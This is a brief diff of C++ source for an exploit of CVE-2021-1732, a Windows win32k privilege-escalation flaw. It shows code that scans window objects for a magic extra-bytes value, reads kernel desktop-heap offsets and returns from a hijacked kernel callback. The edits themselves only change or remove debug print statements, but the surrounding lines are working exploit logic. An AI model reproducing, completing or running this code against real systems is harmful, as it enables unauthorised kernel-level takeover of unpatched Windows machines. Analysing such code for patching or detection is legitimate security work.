@@ -52,7 +52,7 @@ namespace CVE_2021_1732
             for (i = 2; i < g_HWNDKs.size(); ++i) {
                 ULONG_PTR cbWndExtra = *reinterpret_cast<ULONG_PTR*>(
                     (reinterpret_cast<ULONG_PTR>(g_HWNDKs[i]) + offset::tagWND::tagWNDK::cbWndExtra));
-                printf("[xxxClient] check: %x\n", cbWndExtra);
+                printf("[*] Check: %x\n", cbWndExtra);
                 if (magicExtra == cbWndExtra) {
                     hwndMagic = (HWND) * (ULONG_PTR*)(g_HWNDKs[i]);
                     break;
@@ -99,11 +99,6 @@ namespace CVE_2021_1732
                 (reinterpret_cast<ULONG_PTR>(g_HWNDKs[1]) + offset::tagWND::tagWNDK::KernelDesktopHeapBaseOffset));
             tag2_reverseBaseOffset = *reinterpret_cast<ULONG_PTR*>( //need repair after exploit
                 (reinterpret_cast<ULONG_PTR>(g_HWNDKs[i]) + offset::tagWND::tagWNDK::KernelDesktopHeapBaseOffset));
-            printf("[+] tagWNDK_0 Desktop heap offset: 0x%p\n", tag0_reverseBaseOffset);
-            printf("[+] tagWNDK_1 Desktop heap offset: 0x%p\n", tag1_reverseBaseOffset);
-            printf("[+] tagWNDK_2 Desktop heap offset: 0x%p\n", tag2_reverseBaseOffset);
-
-            printf("[+] Magic HWND offset to Desktop Heap base: 0x%p--->0x%p\n", tag2_reverseBaseOffset, result.retvalue);
             return NtCallbackReturn(reinterpret_cast<DWORD64*>(&result), sizeof(result), 0);
         }
     end:
